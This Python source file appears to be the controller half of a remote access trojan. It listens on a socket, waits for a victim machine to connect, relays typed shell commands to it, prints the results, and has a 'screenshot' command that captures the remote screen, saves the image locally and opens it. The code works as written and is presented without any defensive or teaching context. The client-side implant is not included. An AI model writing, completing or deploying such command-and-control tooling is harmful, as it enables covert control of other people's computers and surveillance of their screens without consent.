import socket
import subprocess
import platform
import os
import threading

class Server:
    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.controling = False
        self.sock = None
        self.bind()
    
    def bind(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.IP, self.PORT))
            self.sock.listen(1)
            print(f"Listening at {self.IP}:{self.PORT}.")
            self.accept()
        except KeyboardInterrupt:
            self.cleanup()

    def accept(self):
        conn = None
        try:
            conn, addr = self.sock.accept()
            conn.send(str("name").encode())
            data = conn.recv(1024).decode(errors='ignore')  # Ignore decoding errors
            print(f"Let's welcome '{data}'")
            self.controling = True
            self.accessing(conn, addr)
        except KeyboardInterrupt:
            self.cleanup()

    def accessing(self, conn, addr):
        try:
            while self.controling:
                userInput = input("$: ").lower()
                conn.send(userInput.encode())
                if userInput == "exit":
                    self.sock.close()
                    exit(0)

                if userInput == "screenshot":
                    threading.Thread(target=self.receive_screenshot, args=(conn,)).start()

                data = conn.recv(1024).decode(errors='ignore')
                if userInput != "screenshot":  # Avoid printing binary data
                    print(data)
        except KeyboardInterrupt:
            self.cleanup(conn)

    def receive_screenshot(self, conn):
        try:
            file_size = int.from_bytes(conn.recv(4), 'big')
            received_size = 0
            screenshot_data = b""

            while received_size < file_size:
                packet = conn.recv(min(1024, file_size - received_size))
                if not packet:
                    break
                screenshot_data += packet
                received_size += len(packet)

            screenshot_filename = "received_screenshot.png"
            with open(screenshot_filename, "wb") as f:
                f.write(screenshot_data)

            print(f"Screenshot received and saved as '{screenshot_filename}'.")

            try:
                current_os = platform.system()
                if current_os == "Darwin":  
                    subprocess.Popen(["open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Linux":  
                    subprocess.Popen(["xdg-open", screenshot_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif current_os == "Windows":  
                    os.startfile(screenshot_filename)
                else:
                    print(f"Unsupported OS: {current_os}. Cannot open the image.")
            except Exception as e:
                print(f"Failed to open image: {str(e)}")
        except Exception as e:
            print(f"Failed to receive screenshot: {str(e)}")    

    def cleanup(self, conn=None):
        self.controling = False

        if conn:
            conn.send("exit".encode())
        if self.sock:
            self.sock.close()

        print("\nSocket closed.")
        exit(0)

IP = "127.0.0.1"
PORT = 13064

Server(IP, PORT)
